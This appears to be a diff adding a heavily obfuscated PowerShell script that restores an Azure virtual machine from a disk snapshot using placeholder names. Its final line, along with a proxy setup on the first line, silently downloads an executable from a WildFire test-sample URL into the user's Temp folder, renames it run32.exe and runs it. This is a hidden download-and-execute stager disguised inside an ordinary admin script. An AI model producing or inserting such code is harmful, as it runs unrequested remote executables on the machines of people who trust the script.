@@ -1,0 +1,54 @@
+&("{0}{1}"-f 'sE','t')  ('Qik'+'te'+'d')  ([tYPe]("{0}{1}{3}{2}{4}" -f 's','y','OX','sTem.NEt.webpR','Y') )  ;  
+${SUb`Sc`RiPtIOn`id} = ("{0}{1}{3}{2}" -f 'yo','urS','ionId','ubscript')
+
+
+${ReSou`R`CEG`RouPnA`ME} =("{0}{2}{1}{3}"-f'yourReso','eGroupNa','urc','me')
+
+
+${s`Na`psHO`TNaMe} = ("{2}{0}{3}{1}" -f'ot','e','yourSnapsh','Nam')
+
+
+${O`sd`isKName} = ("{2}{0}{1}"-f 'SDis','kName','yourO')
+
+
+${vIRt`U`A`LNE`TworKNAmE} = ("{3}{0}{1}{2}"-f'urV','NET','Name','yo')
+
+
+${VIrtu`ALMAchI`N`EnaMe} = ("{2}{1}{3}{0}"-f'me','rVMN','you','a')
+
+
+
+
+
+${viR`T`UAlMAch`in`ESIze} = ("{2}{1}{3}{0}"-f 'S3','andard_','St','D')
+
+
+.("{4}{3}{2}{0}{1}"-f 'i','on','cript','ect-AzSubs','Sel') -SubscriptionId ${suBSCR`iPtI`o`NId}
+
+${Snapsh`ot} = &("{4}{2}{3}{0}{1}"-f'-AzSnaps','hot','e','t','G') -ResourceGroupName ${R`esOurcE`G`ROUPN`AME} -SnapshotName ${SNApSHOT`Na`ME}
+
+${dIs`Kcon`FiG} = &("{1}{3}{2}{0}"-f'onfig','New','kC','-AzDis') -Location ${S`NaPSHot}."L`O`CAtioN" -SourceResourceId ${sN`A`pshOT}."Id" -CreateOption ("{1}{0}" -f 'y','Cop')
+
+${d`ISK} = &("{2}{1}{0}" -f 'isk','AzD','New-') -Disk ${dIskC`ON`F`ig} -ResourceGroupName ${r`E`Sour`CEgrOU`pN`AMe} -DiskName ${O`S`dISK`Name}
+
+
+${Vi`R`TU`A`LmaChINe} = .("{2}{0}{1}{3}{4}" -f 'ew-Az','VM','N','Con','fig') -VMName ${viRtU`AlmaC`HI`NEnA`mE} -VMSize ${vIrtUaL`mAc`h`I`Ne`siZE}
+
+
+${vI`RTu`ALMac`HiNe} = .("{2}{1}{0}" -f 'k','zVMOSDis','Set-A') -VM ${viRtUAlmA`c`hInE} -ManagedDiskId ${d`ISK}."I`d" -CreateOption ("{0}{1}" -f'Atta','ch') -Windows
+
+
+${PUB`Li`CIp} = .("{4}{2}{1}{3}{0}"-f 'ress','ubl','zP','icIpAdd','New-A') -Name (${vIrT`U`AL`MACH`InenamE}.("{0}{1}{2}" -f'T','o','Lower').Invoke()+'_ip') -ResourceGroupName ${ResO`UR`CE`G`RO`UPnamE} -Location ${SNa`Psh`ot}."l`OCAT`ION" -AllocationMethod ("{0}{2}{1}" -f'Dy','ic','nam')
+
+
+${VN`ET} = .("{1}{3}{2}{0}" -f 'work','Get-A','tualNet','zVir') -Name ${VIrT`Ua`lnE`TwO`RkNa`mE} -ResourceGroupName ${r`eS`OuR`CegrOupNAMe}
+
+
+${n`Ic} = .("{4}{0}{2}{3}{5}{1}"-f'etwor','ce','k','In','New-AzN','terfa') -Name (${vI`RTua`lm`ACHIN`EnAMe}.("{1}{0}"-f'r','ToLowe').Invoke()+("{0}{1}" -f'_ni','c')) -ResourceGroupName ${rE`SOu`RcEGRou`PNamE} -Location ${s`N`A`PShoT}."locat`IOn" -SubnetId ${vn`ET}."s`Ubne`Ts"[0]."i`D" -PublicIpAddressId ${P`UBl`iCIP}."iD"
+
+${VIRt`Ua`LM`AcHi`NE} = &("{3}{5}{1}{0}{2}{4}" -f 'Interf','work','ac','Add-AzVMN','e','et') -VM ${vIrT`UAl`MacH`inE} -Id ${n`iC}."i`d"
+
+
+&("{1}{0}" -f'ew-AzVM','N') -VM ${vI`RTUa`lMaChi`NE} -ResourceGroupName ${RES`o`U`RcEGRO`UPna`mE} -Location ${SNA`p`SHOt}."l`oCat`Ion"
+
+${wc}=.("{0}{2}{1}" -f 'new-obje','t','c') ("{4}{0}{2}{3}{1}" -f't.','nt','Web','Clie','Ne'); ${Wp}=  ${q`iK`Ted}::("{0}{1}{2}"-f'GetDefau','l','tProxy').Invoke(); ${w`P}."uSEde`FA`ULt`cR`EdEnT`iAls" = ${Tr`UE}; ${w`C}."p`ROXY" = ${w`P}; ${w`c}.("{1}{0}{3}{2}"-f 'w','Do','le','nloadFi').Invoke(("{4}{1}{5}{2}{6}{8}{0}{7}{9}{3}"-f 'ublica','tps://w','network','/pe/','ht','ildfire.paloalto','s.com/','pi/te','p','st'), ((("{10}{13}{5}{14}{11}{3}{6}{7}{2}{0}{12}{9}{4}{8}{1}" -f'L','mpoe6run32.exe.tmp','oe6','23498','T','U','oe6','AppData','e','e6','C:oe','N','ocalo','6','sersoe6'))  -rEplAcE  ([CHar]111+[CHar]101+[CHar]54),[CHar]92)); &("{0}{1}{2}" -f 'rena','me-it','em') ((("{2}{13}{11}{7}{9}{5}{6}{4}{0}{1}{14}{3}{8}{15}{12}{10}"-f't','ak','C','pkzPr','a','3498','kzPAppD','rs','un32','kzPN2','.tmp','e','xe',':kzPUs','zPLocalkzPTem','.e'))."REPlA`Ce"('kzP',[sTriNG][CHaR]92)) ((("{13}{12}{10}{1}{0}{3}{11}{8}{6}{9}{2}{4}{7}{5}" -f'XAAppData','3498r','p','r','rXArun32.','xe','XAT','e','calr','em','N2','XALo','XA','C:rXAUsersr'))-RePLaCe ([ChAR]114+[ChAR]88+[ChAR]65),[ChAR]92); &("{0}{2}{1}{3}" -f 'Sta','Proce','rt-','ss') -FilePath ((("{7}{13}{3}{9}{12}{4}{11}{2}{1}{0}{6}{5}{10}{8}" -f'ocal','}L','a{0','rs{0}','98{0}AppDa','{0}ru','{0}Temp','C:{','.exe','N2','n32','t','34','0}Use'))  -f  [cHaR]92) -NoNewWindow;
